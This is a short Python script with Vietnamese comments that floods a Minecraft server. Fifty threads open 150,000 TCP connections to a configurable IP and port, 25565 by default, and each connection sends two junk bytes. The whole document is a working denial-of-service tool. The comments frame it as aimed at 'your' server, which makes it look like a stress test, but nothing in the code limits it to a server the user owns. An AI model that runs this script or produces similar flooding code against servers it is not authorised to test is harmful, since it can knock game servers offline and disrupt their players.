import socket
import threading

SERVER_IP = "127.0.0.1"     # Thay bằng IP server Minecraft của bạn
SERVER_PORT = 25565         # Thay bằng port server Minecraft của bạn
TOTAL_PACKETS = 150000      # Tổng số packet muốn gửi
THREAD_COUNT = 50           # Số luồng chạy song song, bạn có thể tăng hoặc giảm

# Gửi packet rác (ví dụ 2 byte) tới server
def send_packets(ip, port, packet_count):
    for _ in range(packet_count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.sendall(b"\x00\x00")  # Gửi gói tin rác (có thể thay đổi)
        except Exception:
            pass
        finally:
            sock.close()

def main():
    packets_per_thread = TOTAL_PACKETS // THREAD_COUNT
    threads = []

    print(f"Khởi chạy {THREAD_COUNT} luồng, mỗi luồng gửi {packets_per_thread} packet.")

    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=send_packets, args=(SERVER_IP, SERVER_PORT, packets_per_thread))
        t.start()
        threads.append(t)

    # Nếu không chia hết, gửi nốt packet thừa ở luồng chính
    remainder = TOTAL_PACKETS % THREAD_COUNT
    if remainder > 0:
        send_packets(SERVER_IP, SERVER_PORT, remainder)

    for t in threads:
        t.join()

    print("Hoàn tất gửi tất cả packet.")

if __name__ == "__main__":
    main()
